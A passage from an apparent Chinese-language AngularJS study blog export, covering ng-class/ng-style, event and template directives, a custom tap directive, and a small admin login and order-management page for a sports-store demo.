&#123; action: \"Call plumber\", complete: false &#125;, &#123; action: \"Buy running shoes\", complete: true &#125;, &#123; action: \"Buy flowers\", complete: false &#125;, &#123; action: \"Call family\", complete: false &#125;]; $scope.buttonNames = [\"Red\", \"Green\", \"Blue\"]; $scope.settings = &#123; Rows: \"Red\", Columns: \"Green\" &#125;; &#125;); &lt;/script&gt; &lt;style&gt; tr.Red &#123; background-color: lightcoral; &#125; tr.Green &#123; background-color: lightgreen;&#125; tr.Blue &#123; background-color: lightblue; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;h3 class=\"panel-header\"&gt;To Do List&lt;/h3&gt; &lt;div class=\"row well\"&gt; &lt;div class=\"col-xs-6\" ng-repeat=\"(key, val) in settings\"&gt; &lt;h4&gt;&#123;&#123;key&#125;&#125;&lt;/h4&gt; &lt;div class=\"radio\" ng-repeat=\"button in buttonNames\"&gt; &lt;label&gt; &lt;input type=\"radio\" ng-model=\"settings[key]\" value=\"&#123;&#123;button&#125;&#125;\"&gt;&#123;&#123;button&#125;&#125; &lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;Action&lt;/th&gt;&lt;th&gt;Done&lt;/th&gt;&lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\" ng-class=\"settings.Rows\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td ng-style=\"&#123;'background-color': settings.Columns&#125;\"&gt; &#123;&#123;item.complete&#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用控制器中的简单对象的Rows设置表格的tr元素的背景色，使用columns设置完成Done一列的背景色，用repeat指令将这两个属性与两组单选框绑定。 如图，ng-class设置class,ng-style设置单个属性，一般来说还是建议使用class，但是由于ng中绑定元素，所以ng-style也是可以一次修改，全部生效的。 处理事件在html元素上定义一些事件，提供与用户交互的功能。ng定义的一组指令，能够指定各种不同的事件。 ng-change 为change事件指定响应，在表单元素内容状态改变时触发，如复选框、输入框 ng-click 单击触发 ng-dbclick 双击触发 ng-copy, ng-cut, ng-paste 复制、剪切、粘贴时触发 ng-focus 获取焦点时触发 ng-blur 失去焦点时触发 ng-keydown, ng-keypress, ng-keyup 按下、释放按键时触发 ng-mousedown, ng-mouseenter, ng-mouseleave, ng-mouseover, ng-mouseup 鼠标与元素发生交互时触发 ng-submit 当表单提交时触发 demo如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directives&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.todos = [ &#123; action: \"Get groceries\", complete: false &#125;, &#123; action: \"Call plumber\", complete: false &#125;, &#123; action: \"Buy running shoes\", complete: true &#125;, &#123; action: \"Buy flowers\", complete: false &#125;, &#123; action: \"Call family\", complete: false &#125;]; $scope.buttonNames = [\"Red\", \"Green\", \"Blue\"]; $scope.data = &#123; rowColor: \"Blue\", columnColor: \"Green\" &#125;; $scope.handleEvent = function (e) &#123; console.log(\"Event type: \" + e.type); $scope.data.columnColor = e.type == \"mouseover\" ? \"Green\" : \"Blue\"; &#125; &#125;); &lt;/script&gt; &lt;style&gt; .Red &#123; background-color: lightcoral; &#125; .Green &#123; background-color: lightgreen; &#125; .Blue &#123; background-color: lightblue; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;h3 class=\"panel-header\"&gt;To Do List&lt;/h3&gt; &lt;div class=\"well\"&gt; &lt;span ng-repeat=\"button in buttonNames\"&gt; &lt;button class=\"btn btn-info\" ng-click=\"data.rowColor = button\"&gt; &#123;&#123;button&#125;&#125; &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; &lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;Action&lt;/th&gt;&lt;th&gt;Done&lt;/th&gt;&lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\" ng-class=\"data.rowColor\" ng-mouseenter=\"handleEvent($event)\" ng-mouseleave=\"handleEvent($event)\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td ng-class=\"data.columnColor\"&gt;&#123;&#123;item.complete&#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 点击表格上排按钮能更改行颜色，鼠标在右侧状态列移入/移出能修改列的颜色 通过$event将事件对象传入控制器绑定的函数，有的时候ng指令使用的事件名称与浏览器实现的事件名称可能不匹配，这种时候可用console.log打印出来测试一下。 ng的事件虽然依赖jQuery,但依然不能兼容到所有情况，所以实际使用时需多测试。 事件指令结合指令使用表达式对事件行为进行控制还是依赖控制器对行为进行控制？这个问题，还得看具体使用，过渡依赖表达式和事件指令会创建出不好测试和维护的代码，在视图中可放一些简单的逻辑，其他复杂逻辑还是放在控制器中。 自定义指令有的时候需要处理一些ng未提供内置指令支持的事件，这时就需要自定义指令了。如下示例自定义touchstart和touchend事件，在点击和释放触屏设备时触发，使用chrome中的移动设备模拟功能。 1234567891011121314151617181920212223242526272829&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directives&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $location) &#123; $scope.message = \"Tap Me!\"; &#125;).directive(\"tap\", function () &#123; return function (scope, elem, attrs) &#123; elem.on(\"touchstart touchend\", function () &#123; scope.$apply(attrs[\"tap\"]); &#125;); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\" tap=\"message = 'Tapped!'\" style=\"font-size:50px\"&gt; &#123;&#123;message&#125;&#125; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 该demo使用directive方法创建一个tap指令，返回一个工厂函数，该函数处理指令所应用的元素，传给函数的参数分别为：指令应用的作用域，应用的元素（jqLite返回的jq对象），应用的元素的属性集合 使用jqLite的on方法为touchstart和touchend事件注册函数，在该函数内使用scope.$apply方法计算指令属性值，该属性值从属性集合中取到，即message = &#39;Tapped!&#39;值。 布尔属性大多数html的属性由其属性值的具体值确定，但某些html元素只要该属性存在即可产生效果，而不管值是什么。比如disabled属性，checked属性，即无法通过设置其值为false来取消该属性。 ng-checked 在input元素上使用，对checked属性， ng-disabled 在input元素和button上使用， ng-open 在details元素上使用， ng-readonly 在input元素上使用 ng-selected 在option元素上使用 12345678910111213141516171819202122232425262728&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directives&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.dataValue = false; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;h3 class=\"panel-header\"&gt;To Do List&lt;/h3&gt; &lt;div class=\"checkbox well\"&gt; &lt;label&gt; &lt;input type=\"checkbox\" ng-model=\"dataValue\"&gt; Set the Data Value &lt;/label&gt; &lt;/div&gt; &lt;button class=\"btn btn-success\" ng-disabled=\"dataValue\"&gt;My Button&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用ng-model创建一个与dataValue属性的双向绑定，然后将这个属性应用到ng-disabled指令上。 其他属性有一些属性是ng无法直接控制的属性 ng-href a元素上href属性 ng-src img元素上src属性 ng-srcset img元素上srcset属性，H5的新属性,允许根据不同的大小和像素密度指定多个图片地址，目前支持不太好。 上述三个属性无法直接写入html元素下该原生属性中，即：123&lt;a href=\"&#123;&#123;data.asrc&#125;&#125;\"&gt;本链接中绑定的模型属性在ng执行前无效&lt;/a&gt;&lt;!-- 正确绑定链接的方式 --&gt;&lt;a ng-href=\"&#123;&#123;data.asrc&#125;&#125;\"&gt;本链接中绑定的地址，ng未执行时不显示链接而仅仅只是普通文本，ng执行时会自动替换原生href属性，&lt;/a&gt;","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-12-绑定和模版指令","slug":"angularjs12","date":"2017-05-17T11:15:19.000Z","updated":"2017-05-17T11:15:19.000Z","comments":true,"path":"2017/05/17/angularjs12/","link":"","permalink":"https://github.com/xmoyKING/2017/05/17/angularjs12/","excerpt":"","text":"学习ng中的绑定，模版指令，同时搞清楚为什么需要这些功能，以及何时应该使用这些功能。 指令其实是指ng通过包含或者增强HTML来创建应用程序，将其作为一个独立的基础模块，初始的时候发现这种混杂着标准和自定义的标签的方式有些不适应，但是熟悉之后就会很开心的接受并使用它们了。 为什么使用指令：指令暴露了ng的核心功能，比如事件处理，表单验证，模版，在这些功能基础之上自定义指令在视图中将模块封装起来，一块一块的组装成整个程序。 何时使用：ng中的各个部分都可以使用指令。 绑定数据绑定是指令中最方便快捷，也最容易上手和强大的功能之一，这种数据绑定的方式使得ng的模版成为开发框架的基础，数据绑定即将模型model中的值插入到html中显示出来。 简单的说，数据绑定分为单向和双向两类，包括 ng-bind, 绑定一个html元素的innerText属性，最常用功能，有一个快捷方法：使用两个重叠的大括号 ng-bind-html, 绑定一个html元素的innerHTML属性，这种方法有一些风险，因为这意味着其实是将内容解释为html标签，是代码，而不是文本。即有可能会存在恶意的代码。 ng-bind-template, 与ng-bind类似，但运行绑定多个表达式，实际开发中基本不会用到 ng-non-bindable, 声明一个不会执行数据绑定的区域，主要用于解决快捷绑定的转义问题 注：以上的几种方式可以作为html元素的属性（常用），也可以作为元素的class（不常用）。1234&lt;!-- 作为属性 --&gt;&lt;p&gt;There are &lt;span ng-bind=\"todos.length\"&gt;&lt;/span&gt; items&lt;/p&gt;&lt;!-- 作为class --&gt;&lt;p&gt;There are &lt;span class=\"ng-bind:todos.length\"&gt;&lt;/span&gt; items&lt;/p&gt; 以下示例展示单向绑定以及非绑定（转义）的使用：1234567891011121314151617181920212223242526272829303132333435363738&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directives&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.todos = [ &#123; action: \"Get groceries\", complete: false &#125;, &#123; action: \"Call plumber\", complete: false &#125;, &#123; action: \"Buy running shoes\", complete: true &#125;, &#123; action: \"Buy flowers\", complete: false &#125;, &#123; action: \"Call family\", complete: false &#125;]; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;h3 class=\"panel-header\"&gt;To Do List&lt;/h3&gt; &lt;div&gt;There are &#123;&#123;todos.length&#125;&#125; items&lt;/div&gt; &lt;div&gt; There are &lt;span ng-bind=\"todos.length\"&gt;&lt;/span&gt; items &lt;/div&gt; &lt;div ng-bind-template= \"First: &#123;&#123;todos[0].action&#125;&#125;. Second: &#123;&#123;todos[1].action&#125;&#125;\"&gt; &lt;/div&gt; &lt;div ng-non-bindable&gt; AngularJS uses &#123;&#123; and &#125;&#125; characters for templates &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 如下示例修改body中的部分代码展示了双向绑定：双向绑定用于那些允许用户输入的数据值的元素，即input,textarea,select等，ng-model指令对所应用元素的内容进行跟踪，实时的更新数据模型以响应用户的修改。数据模型的变化会被传递到所有绑定上，保证了应用上数据和视图的同步。123456789&lt;h3 class=\"panel-header\"&gt;To Do List&lt;/h3&gt;&lt;div class=\"well\"&gt; &lt;div&gt;The first item is: &#123;&#123;todos[0].action&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"form-group well\"&gt; &lt;label for=\"firstItem\"&gt;Set First Item:&lt;/label&gt; &lt;input name=\"firstItem\" class=\"form-control\" ng-model=\"todos[0].action\" /&gt;&lt;/div&gt; 其实若自己实现双向绑定也不困难，监听input元素的更改，然后更改对应的展示元素即可（ng中是通过$scope服务对事件进行传播的，所以能快速的更新到所有的绑定元素上) 模版指令ng包含了一些可使用模版生成html的指令，使得根据数据集合向模版添加一些基本的逻辑变得更加方便。 ng-cloak， 用css样式隐藏内联的绑定表达式，但在第一次加载页面时ng的绑定表达式会短暂可见 ng-include, 向dom中插入一段html ng-repeat，迭代的数组中或对象中的单项数据生成html ng-repeat-start, 表示包含多个顶层元素的重复区域的开始部分，具体看示例 ng-repeat-end，类似start，但表示结束部分 ng-switch，根据数据绑定的值修改dom中的元素 绑定对象的键值，123456789101112131415&lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;Action&lt;/th&gt; &lt;th&gt;Done&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat=\"item in todos\"&gt; &lt;td ng-repeat=\"(key, value) in item\"&gt; &#123;&#123;key&#125;&#125;=&#123;&#123;value&#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; 同时ng-repeat指令还有一些内置的变量： $index 返回当前对象或属性的索引位置 $first 若当前对象为集合中的第一个则返回true $last 若为最后一个则返回true $middle 若当前对象不是第一个也不是最后一个则返回true $even 若当前对象为第偶数个则返回true $odd 若为奇数个则返回true 123456789101112131415&lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;#&lt;/th&gt; &lt;th&gt;Action&lt;/th&gt; &lt;th&gt;Done&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td ng-repeat=\"prop in item\"&gt; &#123;&#123;prop&#125;&#125; &lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; ng-repeat指令对所处理对象或属性重复生成多个顶层元素和内容，在需要对每个处理的数据项生成多个表格时最常遇到这种问题，比如tr元素1234567891011&lt;tbody&gt; &lt;tr ng-repeat-start=\"item in todos\"&gt; &lt;td&gt;This is item &#123;&#123;$index&#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;The action is: &#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;tr ng-repeat-end&gt; &lt;td&gt;Item &#123;&#123;$index&#125;&#125; is &#123;&#123;$item.complete? '' : \"not \"&#125;&#125; complete&lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; ng-include即可作为html元素，也可作为属性和class，但是注意，当作为元素使用的时候，必须有关闭标签，而不是空标签。同时注意include使用的时候用了单引号将文件位置指定为字符串变量。 1234&lt;div id=\"todoPanel\" class=\"panel\" ng-controller=\"defaultCtrl\"&gt; &lt;h3 class=\"panel-header\"&gt;To Do List&lt;/h3&gt; &lt;ng-include src=\"'table.html'\"&gt;&lt;/ng-include&gt;&lt;/div&gt; table.html文件内容12345678910111213&lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;#&lt;/th&gt; &lt;th&gt;Action&lt;/th&gt; &lt;th&gt;Done&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\" ng-class=\"$odd ? 'odd' : 'even'\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td ng-repeat=\"prop in item\"&gt;&#123;&#123;prop&#125;&#125;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; ng-include有三个配置参数： src 指定要加载的内容的url变量，本质其实是使用ajax的方式加载，即这个地址是可以计算的变量。 onload 指定在内容被加载时调用的表达式 autoscroll 指定加载是是否应该滚动到视图区域 123$scope.viewFile = function () &#123; return $scope.showList ? \"list.html\" : \"table.html\";&#125;; 1&lt;ng-include src=\"viewFile()\"&gt;&lt;/ng-include&gt; 使用ng-switch也能做到切换局部的视图： 123456789101112131415161718192021222324252627282930313233&lt;div class=\"well\"&gt; &lt;div class=\"radio\" ng-repeat=\"button in ['None', 'Table', 'List']\"&gt; &lt;label&gt; &lt;input type=\"radio\" ng-model=\"data.mode\" value=\"&#123;&#123;button&#125;&#125;\" ng-checked=\"$first\" /&gt; &#123;&#123;button&#125;&#125; &lt;/label&gt; &lt;/div&gt;&lt;/div&gt;&lt;div ng-switch on=\"data.mode\"&gt; &lt;div ng-switch-when=\"Table\"&gt; &lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;Action&lt;/th&gt;&lt;th&gt;Done&lt;/th&gt;&lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=\"item in todos\" ng-class=\"$odd ? 'odd' : 'even'\"&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td ng-repeat=\"prop in item\"&gt;&#123;&#123;prop&#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;div ng-switch-when=\"List\"&gt; &lt;ol&gt; &lt;li ng-repeat=\"item in todos\"&gt; &#123;&#123;item.action&#125;&#125;&lt;span ng-if=\"item.complete\"&gt; (Done)&lt;/span&gt; &lt;/li&gt; &lt;/ol&gt; &lt;/div&gt; &lt;div ng-switch-default&gt; Select another option to display a layout &lt;/div&gt;&lt;/div&gt; 区别：ng-switch用于文档间较小代码块的切换，ng-switch指令所需的内容是作为html文档的一部分的，而ng-include多用于处理较复杂或较多且独立的局部片段，尤其是需要在不同地方包含相同的内容时，局部视图有助于减少重复。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-11-后台管理系统","slug":"angularjs11","date":"2017-05-14T05:28:21.000Z","updated":"2017-05-14T05:28:21.000Z","comments":true,"path":"2017/05/14/angularjs11/","link":"","permalink":"https://github.com/xmoyKING/2017/05/14/angularjs11/","excerpt":"","text":"前面已经完成了整个运动商店应用客户端的编写，简化了界面设计，只完成了关键的商品展示-加入购物车-下订单流程。现在我们需要晚上整个sports store的流程，那就是开发一个后端管理程序对商品和订单进行管理。 完成界面如下： 在管理项目中不需要store部分的内容，可以独立开启一个项目，将代码与普通用户端分开 目录组织结构：12345678910111213141516171819202122232425262728293031323334353637angularjs #项目目录 .dpd #deployd的一些信息 pids keys.json #保存dpd keygen命令生成的key data public #deployd项目生成的静态文件目录 controllers #控制器文件夹+ adminControllers.js #后台管理系统的模块 adminProductController.js #管理产品的控制器 ngmodules #存放ng的插件 angular-route.js #路由插件 angular-resources.js #RESTful风格接口插件 views #存放视图文件夹 adminLogin.html #登录视图 adminMain.html #后台主页面视图 adminOrders.html #订单查看视图 adminProducts.html #产品管理视图 angular.js #文件 bootstrap-theme.css bootstrap.css admin.html #静态应用入口文件 resources #此目录保存deployd dashboard中创建的表的结构（严格来说不是表而是collection） orders #order表 config.json #order表结构（字段类型） delete.js #对Ajax中的delete方法的设置 get.js #同delete.js put.js #同delete.js products config.json delete.js #对Ajax中的delete方法的设置 put.js #同delete.js users config.json app.dpd server.js #启动deployd服务器脚本node_modules #node包目录package.json #项目信息，包括启动服务器脚本 管理员登录页面，分清普通用户和管理员的权限，所以需要对products表和orders表做一些限制，禁止非管理员用户删除或更新，而dpd对这些表的API提供了一些功能，此时可以在dashboard中的表的API对应的方法设置，比如产品接口的删除方法： 这里输入的脚本是js代码（因为dpd基于node的），同时这里的me表示当前登录的用户。保存后就在会项目目录下的resources文件加下发现对应的表中有相应的js脚本文件。 我们有管理员和普通用户的区别，则需要新建一个用户表。使用dpd dashboard中的创建菜单中的Users Collection项，创建的表（dpd会默认设置一些用户字段，如username和password, 同时也会在API中默认预设很多接口，如登录，退出），而不是mongodb数据库的User表（一个全小写，一个首字母大写）。 如下，新建user用户表后，添加一个管理员帐号adminX,密码输入后保存自动为密文 然后此时需要注意这种Users Collection类型的表的特殊之处，如下所示，可以看到登录的接口为/users/login，以及需要username和password两个字段。 附上完成后的产品界面和订单界面： 后台管理页面的主入口页面admin.html123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html ng-app=\"sportsStoreAdmin\"&gt;&lt;head&gt; &lt;title&gt;Administration&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"ngmodules/angular-route.js\"&gt;&lt;/script&gt; &lt;!-- 添加resource插件，用于RESTful风格的CRUD操作 --&gt; &lt;script src=\"ngmodules/angular-resource.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; // 定义新的管理模块，同时需要使用到路由和RESTful插件 angular.module(\"sportsStoreAdmin\", [\"ngRoute\", \"ngResource\"]) .config(function ($routeProvider) &#123; // 配置路由和视图 $routeProvider.when(\"/login\", &#123; templateUrl: \"/views/adminLogin.html\" &#125;); $routeProvider.when(\"/main\", &#123; templateUrl: \"/views/adminMain.html\" &#125;); $routeProvider.otherwise(&#123; redirectTo: \"/login\" &#125;); &#125;); &lt;/script&gt; &lt;script src=\"controllers/adminControllers.js\"&gt;&lt;/script&gt; &lt;script src=\"controllers/adminProductController.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;ng-view /&gt;&lt;/body&gt;&lt;/html&gt; 后台登录视图adminLogin.html, 未登录状态下则进入此页面123456789101112131415161718192021222324252627282930 &lt;!-- 登录视图，设置控制器 --&gt; &lt;div class=\"well\" ng-controller=\"authCtrl\"&gt; &lt;div class=\"alert alert-info\" ng-hide=\"authenticationError\"&gt; Enter your username and password and click Log In to authenticate &lt;/div&gt; &lt;div class=\"alert alert-danger\" ng-show=\"authenticationError\"&gt; Authentication Failed (&#123;&#123;authenticationError.status&#125;&#125;). Try again. &lt;/div&gt; &lt;!-- 登录表单 --&gt; &lt;form name=\"authForm\" novalidate&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Username&lt;/label&gt; &lt;input name=\"username\" class=\"form-control\" ng-model=\"username\" required /&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Password&lt;/label&gt; &lt;input name=\"password\" type=\"password\" class=\"form-control\" ng-model=\"password\" required /&gt; &lt;/div&gt; &lt;div class=\"text-center\"&gt; &lt;button ng-click=\"authenticate(username, password)\" ng-disabled=\"authForm.$invalid\" class=\"btn btn-primary\"&gt; Log In &lt;/button&gt; &lt;/div&gt; &lt;/form&gt;&lt;/div&gt; 后台主页面视图adminMain.html，登录成功后进入此页面123456789101112&lt;!-- 后台主页面 --&gt;&lt;div class=\"panel panel-default row\" ng-controller=\"mainCtrl\"&gt; &lt;div class=\"col-xs-3 panel-body\"&gt; &lt;a ng-repeat=\"item in screens\" class=\"btn btn-block btn-default\" ng-class=\"&#123;'btn-primary': item == current &#125;\" ng-click=\"setScreen($index)\"&gt; &#123;&#123;item&#125;&#125; &lt;/a&gt; &lt;/div&gt; &lt;div class=\"col-xs-8 panel-body\"&gt; &lt;div ng-include=\"getScreen()\" /&gt; &lt;/div&gt;&lt;/div&gt; 订单管理页面 adminOrders.html， 实际生产中，订单管理往往是一个非常复杂的过程，比如支付验证，库存管理，筛选，运输，订单的删除，导出，统计等，此处仅仅实现了一个最简单版本的订单管理，那就是查看订单。12345678910111213141516171819202122232425262728293031&lt;!-- 订单管理页面， 设置订单控制器 --&gt;&lt;div ng-controller=\"ordersCtrl\"&gt; &lt;!-- 订单列表 --&gt; &lt;table class=\"table table-striped table-bordered\"&gt; &lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;City&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;/tr&gt; &lt;tr ng-repeat=\"order in orders\"&gt; &lt;td&gt;&#123;&#123;order.name&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;order.city&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;calcTotal(order) | currency&#125;&#125;&lt;/td&gt; &lt;td&gt; &lt;!-- 此处对每一个订单都将该订单的全部信息传入selectOrder函数 --&gt; &lt;button ng-click=\"selectOrder(order)\" class=\"btn btn-xs btn-primary\"&gt; Details &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;!-- 显示选定的订单详情 --&gt; &lt;div ng-show=\"selectedOrder\"&gt; &lt;h3&gt;Order Details&lt;/h3&gt; &lt;table class=\"table table-striped table-bordered\"&gt; &lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Count&lt;/th&gt;&lt;th&gt;Price&lt;/th&gt;&lt;/tr&gt; &lt;tr ng-repeat=\"item in selectedOrder.products\"&gt; &lt;td&gt;&#123;&#123;item.name&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.count&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.price| currency&#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;&lt;/div&gt; 后台管理页面的一些控制器，不含产品管理控制器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859angular.module(\"sportsStoreAdmin\") // 获取管理模块.constant(\"authUrl\", \"/users/login\") // 注意此处的接口是由dpd API中定义的.constant(\"ordersUrl\", \"/orders\").controller(\"authCtrl\", function ($scope, $http, $location, authUrl) &#123; // 登录验证控制器 $scope.authenticate = function (user, pass) &#123; $http.post(authUrl, &#123; username: user, password: pass &#125;, &#123; withCredentials: true &#125;).success(function (data) &#123; $location.path(\"/main\"); &#125;).error(function (error) &#123; $scope.authenticationError = error; &#125;); &#125;&#125;).controller(\"mainCtrl\", function ($scope) &#123; // 主页面控制器，其实就是可以切换产品/订单的一个tab // 定义screen分别有产品和订单 $scope.screens = [\"Products\", \"Orders\"]; $scope.current = $scope.screens[0]; // 切换操作 $scope.setScreen = function (index) &#123; $scope.current = $scope.screens[index]; &#125;; // 获取对应screen界面 $scope.getScreen = function () &#123; return $scope.current == \"Products\" ? \"/views/adminProducts.html\" : \"/views/adminOrders.html\"; &#125;;&#125;).controller(\"ordersCtrl\", function ($scope, $http, ordersUrl) &#123; // 订单管理页面控制器 // 此处的withCredemtials属性确保浏览器包含安全的cookie并随ajax提交到服务器端 $http.get(ordersUrl, &#123; withCredentials: true &#125;) .success(function (data) &#123; $scope.orders = data; &#125;) .error(function (error) &#123; $scope.error = error; &#125;); $scope.selectedOrder; // 设置当前选定的订单 $scope.selectOrder = function (order) &#123; $scope.selectedOrder = order; &#125;; // 计算订单产品数量总和 $scope.calcTotal = function (order) &#123; var total = 0; for (var i = 0; i &lt; order.products.length; i++) &#123; total += order.products[i].count * order.products[i].price; &#125; return total; &#125;&#125;); 产品管理页面 adminProducts.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!-- 产品管理页面 --&gt;&lt;!-- 显示了ng指令如何用于管理有状态的编辑视图 --&gt;&lt;style&gt; #productTable &#123; width: auto; &#125; #productTable td &#123; max-width: 150px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; &#125; #productTable td input &#123; max-width: 125px; &#125;&lt;/style&gt;&lt;div ng-controller=\"productCtrl\"&gt; &lt;table id=\"productTable\" class=\"table table-striped table-bordered\"&gt; &lt;tr&gt; &lt;th&gt;Name&lt;/th&gt; &lt;th&gt;Description&lt;/th&gt; &lt;th&gt;Category&lt;/th&gt; &lt;th&gt;Price&lt;/th&gt; &lt;th&gt;&lt;/th&gt; &lt;/tr&gt; &lt;tr ng-repeat=\"item in products\" ng-hide=\"item.id == editedProduct.id\"&gt; &lt;td&gt;&#123;&#123;item.name&#125;&#125;&lt;/td&gt; &lt;td class=\"description\"&gt;&#123;&#123;item.description&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.category&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.price | currency&#125;&#125;&lt;/td&gt; 